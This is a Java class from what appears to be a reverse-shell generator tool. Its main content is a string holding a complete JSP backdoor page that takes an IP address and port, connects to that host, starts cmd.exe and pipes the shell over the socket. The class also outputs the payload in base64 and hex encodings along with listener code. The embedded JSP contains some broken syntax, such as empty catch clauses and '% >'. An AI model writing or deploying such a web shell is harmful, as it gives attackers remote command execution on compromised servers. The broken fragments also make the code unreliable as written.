package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Java_web extends Reverse {

    protected String shellFormat = "";

    public Java_web(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
    }

    @Override
    public String getShellCode(){
        return "<%@\r\n" + //
                "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\r\n" + //
                "% >\r\n" + //
                "<%!\r\n" + //
                "static class StreamConnector extends Thread\r\n" + //
                "{\r\n" + //
                "        InputStream is;\r\n" + //
                "        OutputStream os;\r\n" + //
                "        StreamConnector(InputStream is, OutputStream os)\r\n" + //
                "        {\r\n" + //
                "                this.is = is;\r\n" + //
                "                this.os = os;\r\n" + //
                "        }\r\n" + //
                "        public void run()\r\n" + //
                "        {\r\n" + //
                "                BufferedReader isr = null;\r\n" + //
                "                BufferedWriter osw = null;\r\n" + //
                "                try\r\n" + //
                "                {\r\n" + //
                "                        isr = new BufferedReader(new InputStreamReader(is));\r\n" + //
                "                        osw = new BufferedWriter(new OutputStreamWriter(os));\r\n" + //
                "                        char buffer[] = new char[8192];\r\n" + //
                "                        int lenRead;\r\n" + //
                "                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\r\n" + //
                "                        {\r\n" + //
                "                                osw.write(buffer, 0, lenRead);\r\n" + //
                "                                osw.flush();\r\n" + //
                "                        }\r\n" + //
                "                }\r\n" + //
                "                catch (Exception ioe)\r\n" + //
                "                try\r\n" + //
                "                {\r\n" + //
                "                        if(isr != null) isr.close();\r\n" + //
                "                        if(osw != null) osw.close();\r\n" + //
                "                }\r\n" + //
                "                catch (Exception ioe)\r\n" + //
                "        }\r\n" + //
                "}\r\n" + //
                "%>\r\n" + //
                "\r\n" + //
                "<h1>JSP Backdoor Reverse Shell</h1>\r\n" + //
                "\r\n" + //
                "<form method=\"post\">\r\n" + //
                "IP Address\r\n" + //
                "<input type=\"text\" name=\"ipaddress\" size=30>\r\n" + //
                "Port\r\n" + //
                "<input type=\"text\" name=\"port\" size=10>\r\n" + //
                "<input type=\"submit\" name=\"Connect\" value=\"Connect\">\r\n" + //
                "</form>\r\n" + //
                "<p>\r\n" + //
                "<hr>\r\n" + //
                "\r\n" + //
                "<%\r\n" + //
                "String ipAddress = request.getParameter(\"ipaddress\");\r\n" + //
                "String ipPort = request.getParameter(\"port\");\r\n" + //
                "if(ipAddress != null && ipPort != null)\r\n" + //
                "{\r\n" + //
                "        Socket sock = null;\r\n" + //
                "        try\r\n" + //
                "        {\r\n" + //
                "                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\r\n" + //
                "                Runtime rt = Runtime.getRuntime();\r\n" + //
                "                Process proc = rt.exec(\"cmd.exe\");\r\n" + //
                "                StreamConnector outputConnector =\r\n" + //
                "                        new StreamConnector(proc.getInputStream(),\r\n" + //
                "                                          sock.getOutputStream());\r\n" + //
                "                StreamConnector inputConnector =\r\n" + //
                "                        new StreamConnector(sock.getInputStream(),\r\n" + //
                "                                          proc.getOutputStream());\r\n" + //
                "                outputConnector.start();\r\n" + //
                "                inputConnector.start();\r\n" + //
                "        }\r\n" + //
                "        catch(Exception e) \r\n" + //
                "}\r\n" + //
                "%>";
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
 
}